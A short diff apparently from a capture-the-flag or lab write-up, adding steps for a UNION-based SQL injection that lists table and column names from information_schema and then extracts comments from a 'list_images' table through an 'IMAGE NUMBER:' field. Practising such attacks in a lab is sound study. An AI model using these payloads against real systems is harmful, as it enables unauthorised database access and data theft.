@@ -1,3 +1,13 @@
+Make this SQL Injection to find table structure : 
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+We are interested by this table :
+--------------------------------------
+|             list_images            |
+--------------------------------------
+|  id  |  url  |  title  |  comment  |
+-------------------------------^------
+
 Make this SQL Injection in the "IMAGE NUMBER:" field :
 1 AND 1=2 UNION SELECT id, comment FROM list_images
 
